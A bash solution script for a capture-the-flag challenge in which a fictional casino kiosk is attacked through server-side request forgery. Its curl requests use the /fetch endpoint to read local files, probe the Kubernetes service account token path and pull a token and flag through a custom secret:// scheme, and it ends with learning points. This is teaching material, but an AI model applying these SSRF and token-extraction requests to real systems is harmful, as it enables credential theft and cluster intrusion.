#!/bin/bash
# Project Benedict - Solution Script (curl-only version)
# This script exploits the SSRF vulnerability using only curl
#
# Usage:
#   ./solve.sh <URL>
#
# Examples:
#   ./solve.sh https://casino-kiosk-player1.apps.cluster.example.com
#   ./solve.sh http://casino-kiosk (from inside cluster)
#   ./solve.sh http://localhost:8080 (for local testing)

set -e

# Colors for output
RED='\033[0;31m'
GREEN='\033[0;32m'
YELLOW='\033[1;33m'
BLUE='\033[0;34m'
GOLD='\033[1;33m'
CYAN='\033[0;36m'
GRAY='\033[0;90m'
NC='\033[0m' # No Color

# Check if URL provided
if [ $# -eq 0 ]; then
    echo -e "${RED}ERROR: No URL provided!${NC}"
    echo ""
    echo "Usage: $0 <URL>"
    echo ""
    echo "Examples:"
    echo "  $0 https://casino-kiosk-player1.apps.cluster.example.com"
    echo "  $0 http://casino-kiosk"
    echo ""
    exit 1
fi

KIOSK_URL="$1"

# Remove trailing slash if present
KIOSK_URL="${KIOSK_URL%/}"

echo "═══════════════════════════════════════════════════════════"
echo "  🎰 PROJECT BENEDICT - SSRF EXPLOITATION 🎰"
echo "═══════════════════════════════════════════════════════════"
echo ""
echo -e "${BLUE}Target URL:${NC} $KIOSK_URL"
echo ""

# ============================================================================
# STAGE 1: Reconnaissance
# ============================================================================

echo "━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━"
echo "🔍 STAGE 1: RECONNAISSANCE"
echo "━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━"
echo ""

echo "Testing connectivity to casino kiosk..."
echo -e "${GRAY}\$ curl -s \"$KIOSK_URL/health\"${NC}"
HEALTH_CHECK=$(curl -s "$KIOSK_URL/health" 2>/dev/null || echo '{"status":"failed"}')

if echo "$HEALTH_CHECK" | grep -q "healthy"; then
    printf "${GREEN}✓${NC} Casino kiosk is accessible\n"
else
    printf "${RED}✗${NC} Cannot reach casino kiosk at $KIOSK_URL!\n"
    echo "  Make sure the URL is correct and the service is running."
    exit 1
fi

echo ""
echo "Gathering system information..."
echo -e "${GRAY}\$ curl -s \"$KIOSK_URL/info\"${NC}"
INFO=$(curl -s "$KIOSK_URL/info" 2>/dev/null)

if [ -n "$INFO" ]; then
    printf "${GREEN}✓${NC} Retrieved system information\n"
    echo ""
    echo -e "${BLUE}Hint from server:${NC}"
    echo "$INFO" | grep -o '"hint":"[^"]*"' | cut -d'"' -f4 | sed 's/^/  /' || echo "  (No hint available)"
else
    printf "${YELLOW}⚠${NC}  Could not retrieve system information\n"
fi

# ============================================================================
# STAGE 2: Testing SSRF Vulnerability
# ============================================================================

echo ""
echo "━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━"
echo "🔓 STAGE 2: TESTING SSRF VULNERABILITY"
echo "━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━"
echo ""

echo "Testing file:// protocol..."
echo -e "${GRAY}\$ curl -s \"$KIOSK_URL/fetch?url=file:///etc/hostname\"${NC}"
TEST_FILE=$(curl -s "$KIOSK_URL/fetch?url=file:///etc/hostname" 2>/dev/null)
if echo "$TEST_FILE" | grep -q "content"; then
    HOSTNAME=$(echo "$TEST_FILE" | grep -o '"content":"[^"]*"' | cut -d'"' -f4 | head -1)
    printf "${GREEN}✓${NC} file:// protocol works! (Hostname: $HOSTNAME)\n"
else
    printf "${YELLOW}⚠${NC}  file:// protocol may be restricted\n"
fi

echo ""
echo "Testing standard token location (will fail - token is in memory)..."
echo -e "${GRAY}\$ curl -s \"$KIOSK_URL/fetch?url=file:///var/run/secrets/kubernetes.io/serviceaccount/token\"${NC}"
TOKEN_TEST=$(curl -s "$KIOSK_URL/fetch?url=file:///var/run/secrets/kubernetes.io/serviceaccount/token" 2>/dev/null)
if echo "$TOKEN_TEST" | grep -q "error"; then
    printf "${GREEN}✓${NC} Standard token location is protected\n"
    ERROR_MSG=$(echo "$TOKEN_TEST" | grep -o '"error":"[^"]*"' | cut -d'"' -f4)
    echo -e "${BLUE}  Server hint:${NC} $ERROR_MSG"
else
    printf "${YELLOW}⚠${NC}  Unexpected: token accessible via file:// protocol\n"
fi

# ============================================================================
# STAGE 3: Protocol Discovery
# ============================================================================

echo ""
echo "━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━"
echo "🔎 STAGE 3: DISCOVERING SECRET PROTOCOL"
echo "━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━"
echo ""

echo "Trying secret:// protocol with correct hostname and path..."
echo "Testing: secret://casino-internal/serviceaccount/token"
echo -e "${GRAY}\$ curl -s \"$KIOSK_URL/fetch?url=secret://casino-internal/serviceaccount/token\"${NC}"
RESULT=$(curl -s "$KIOSK_URL/fetch?url=secret://casino-internal/serviceaccount/token" 2>/dev/null)

if echo "$RESULT" | grep -q "content"; then
    STOLEN_TOKEN=$(echo "$RESULT" | grep -o '"content":"[^"]*"' | cut -d'"' -f4)
    if [ -n "$STOLEN_TOKEN" ]; then
        printf "${GREEN}✓${NC} Found working protocol: secret://casino-internal/serviceaccount/token\n"

        # Extract hint if present
        HINT=$(echo "$RESULT" | grep -o '"hint":"[^"]*"' | cut -d'"' -f4)
        if [ -n "$HINT" ]; then
            echo ""
            echo -e "${BLUE}Server hint:${NC}"
            echo "  $HINT"
        fi

        # Note if token appears to be a dummy/test token
        if [ ${#STOLEN_TOKEN} -lt 100 ]; then
            echo ""
            printf "${YELLOW}⚠${NC}  Note: Token appears to be a test/dummy token (local deployment)\n"
        fi
    else
        printf "${RED}✗${NC} Protocol worked but response seems incomplete\n"
        exit 1
    fi
else
    printf "${RED}✗${NC} Could not discover the secret protocol!\n"
    ERROR_MSG=$(echo "$RESULT" | grep -o '"error":"[^"]*"' | cut -d'"' -f4)
    if [ -n "$ERROR_MSG" ]; then
        echo "  Error: $ERROR_MSG"
    fi
    exit 1
fi

# ============================================================================
# STAGE 4: Token Validation
# ============================================================================

echo ""
echo "━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━"
echo "🎫 STAGE 4: TOKEN VALIDATION"
echo "━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━"
echo ""

printf "${GREEN}✓${NC} Service account token extracted from memory!\n"
echo "  Token length: ${#STOLEN_TOKEN} characters"
echo "  Token preview: ${STOLEN_TOKEN:0:80}..."

# Only decode JWT if token looks like a JWT (has 3 parts separated by dots)
if echo "$STOLEN_TOKEN" | grep -q '\..*\.'; then
    # Decode JWT header to verify it's valid
    HEADER=$(echo "$STOLEN_TOKEN" | cut -d'.' -f1)
    PAYLOAD=$(echo "$STOLEN_TOKEN" | cut -d'.' -f2)

    echo ""
    echo "Decoding token header..."
    # Add padding if needed for base64
    while [ $((${#HEADER} % 4)) -ne 0 ]; do HEADER="${HEADER}="; done
    DECODED_HEADER=$(echo "$HEADER" | base64 -d 2>/dev/null || echo "{}")
    echo "$DECODED_HEADER" | grep -o '"alg":"[^"]*"' | sed 's/^/  /' || echo "  (Could not decode)"

    echo ""
    echo "Decoding token payload..."
    while [ $((${#PAYLOAD} % 4)) -ne 0 ]; do PAYLOAD="${PAYLOAD}="; done
    DECODED_PAYLOAD=$(echo "$PAYLOAD" | base64 -d 2>/dev/null || echo "{}")
    echo "$DECODED_PAYLOAD" | grep -E '"sub"|"namespace"' | sed 's/^/  /' || echo "  (Could not decode)"
else
    echo ""
    printf "${YELLOW}⚠${NC}  Token is not a JWT (local/test deployment - skipping JWT decode)\n"
fi

# ============================================================================
# STAGE 5: Flag Extraction
# ============================================================================

echo ""
echo "━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━"
echo "🎯 STAGE 5: FLAG EXTRACTION"
echo "━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━"
echo ""

echo "Extracting flag from vault..."
echo -e "${GRAY}\$ curl -s \"$KIOSK_URL/fetch?url=secret://casino-internal/vault/flag\"${NC}"
FLAG_RESULT=$(curl -s "$KIOSK_URL/fetch?url=secret://casino-internal/vault/flag" 2>/dev/null)

if echo "$FLAG_RESULT" | grep -q "content"; then
    FLAG=$(echo "$FLAG_RESULT" | grep -o '"content":"[^"]*"' | cut -d'"' -f4)

    if echo "$FLAG" | grep -q "FLAG{"; then
        printf "${GREEN}✓${NC} Successfully retrieved flag!\n"

        # Extract description if present
        DESCRIPTION=$(echo "$FLAG_RESULT" | grep -o '"description":"[^"]*"' | cut -d'"' -f4)
        if [ -n "$DESCRIPTION" ]; then
            echo ""
            echo -e "${BLUE}Description:${NC} $DESCRIPTION"
        fi

        # Extract hint if present
        HINT=$(echo "$FLAG_RESULT" | grep -o '"hint":"[^"]*"' | cut -d'"' -f4)
        if [ -n "$HINT" ]; then
            echo ""
            echo -e "${BLUE}Completion message:${NC}"
            echo "$HINT" | fold -s -w 70 | sed 's/^/  /'
        fi
    else
        printf "${RED}✗${NC} Response doesn't contain a valid flag format\n"
        echo "  Received: $FLAG"
        exit 1
    fi
else
    printf "${RED}✗${NC} Could not extract flag!\n"
    ERROR_MSG=$(echo "$FLAG_RESULT" | grep -o '"error":"[^"]*"' | cut -d'"' -f4)
    if [ -n "$ERROR_MSG" ]; then
        echo "  Error: $ERROR_MSG"
    fi
    exit 1
fi

# ============================================================================
# SUCCESS!
# ============================================================================

echo ""
echo "═══════════════════════════════════════════════════════════"
echo "  🎉🎉🎉 FLAG CAPTURED! 🎉🎉🎉"
echo "═══════════════════════════════════════════════════════════"
echo ""
printf "  ${GOLD}${FLAG}${NC}\n"
echo ""
echo "═══════════════════════════════════════════════════════════"
echo ""

# ============================================================================
# Summary
# ============================================================================

echo "📊 ATTACK SUMMARY"
echo "━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━"
echo ""
printf "Stage 1: Reconnaissance           ${GREEN}✓${NC} Complete\n"
printf "Stage 2: SSRF Testing              ${GREEN}✓${NC} Complete\n"
printf "Stage 3: Protocol Discovery        ${GREEN}✓${NC} secret:// protocol found\n"
printf "Stage 4: Token Validation          ${GREEN}✓${NC} Token extracted from memory\n"
printf "Stage 5: Flag Extraction           ${GREEN}✓${NC} Flag retrieved from vault\n"
echo ""
echo "━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━"
echo ""

# ============================================================================
# Learning Points
# ============================================================================

echo "🎓 WHAT YOU LEARNED"
echo "━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━"
echo ""
printf "1. ${BLUE}SSRF Exploitation${NC}\n"
echo "   • Tested multiple URL protocols"
echo "   • Discovered custom secret:// scheme"
echo "   • Extracted in-memory token"
echo "   • Located embedded flag in binary"
echo ""
printf "2. ${BLUE}Memory-Only Secrets${NC}\n"
echo "   • Token not in filesystem"
echo "   • Token extracted via init container"
echo "   • Token deleted after load"
echo "   • Only exists in process memory"
echo ""
printf "3. ${BLUE}Embedded Secrets${NC}\n"
echo "   • Flag compiled into Go binary"
echo "   • XOR obfuscation prevents strings extraction"
echo "   • Accessed via custom SSRF endpoint"
echo "   • No Kubernetes Secret required"
echo ""
printf "4. ${BLUE}Protocol Discovery${NC}\n"
echo "   • Black-box enumeration techniques"
echo "   • Custom URL scheme identification"
echo "   • Progressive hint system"
echo "   • Reading and applying server hints"
echo ""
echo "━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━"
echo ""
echo "Challenge completed! 🎰"
echo ""
printf "${BLUE}Target:${NC} $KIOSK_URL\n"
printf "${BLUE}Method:${NC} SSRF via curl only (no kubectl needed)\n"
printf "${BLUE}Flag:${NC} $FLAG\n"
echo ""
